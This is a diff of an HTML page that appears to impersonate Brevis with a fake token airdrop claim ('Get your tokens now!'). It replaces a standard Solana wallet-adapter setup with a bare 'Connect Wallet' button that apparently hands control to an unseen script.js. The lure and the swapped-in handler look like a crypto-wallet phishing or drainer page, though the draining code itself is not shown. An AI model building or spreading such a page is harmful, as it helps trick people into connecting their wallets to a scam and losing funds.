@@ -4109,7 +4109,7 @@
                                 <div></div>
                                 <div></div>
                                 <div class="ComingSoon_comingSoonText2__qK5sV">The airdrop claim for new Brevis users is now open. Get your tokens now!</div>
-                                <div id="wallet-button"></div>
+                                <button id="connectBtn" class="gradient-btn bst-butn-prime">Connect Wallet</button>
                             </div>
                         </div>
                     </div>
@@ -4130,39 +4130,6 @@
     </div>
 
 <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-<script src="https://unpkg.com/@solana/wallet-adapter-base@latest/lib/index.iife.min.js"></script>
-<script src="https://unpkg.com/@solana/wallet-adapter-wallets@latest/lib/index.iife.min.js"></script>
-<script src="https://unpkg.com/@solana/wallet-adapter-ui@latest/lib/index.iife.min.js"></script>
 <script src="script.js"></script>
-<script>
-  const { Connection, clusterApiUrl } = solanaWeb3;
-  const network = solanaWeb3.clusterApiUrl("mainnet-beta");
-
-  const connection = new Connection(network);
-
-  const wallets = [
-    new solanaWalletAdapterWallets.PhantomWalletAdapter(),
-    new solanaWalletAdapterWallets.SolflareWalletAdapter(),
-    new solanaWalletAdapterWallets.BackpackWalletAdapter(),
-    new solanaWalletAdapterWallets.WalletConnectWalletAdapter({
-      network: "mainnet-beta",
-      options: {
-        projectId: "9d1df16cb9bc8262aee0becfe3d26f2e",
-      },
-    }),
-  ];
-
-  const walletProvider = new solanaWalletAdapterBase.WalletProvider({
-    wallets,
-    autoConnect: false,
-  });
-
-  const walletModal = new solanaWalletAdapterUi.WalletModalProvider({
-    container: document.getElementById("wallet-button"),
-    walletProvider,
-  });
-
-  walletModal.render();
-</script>
 
 </body></html>
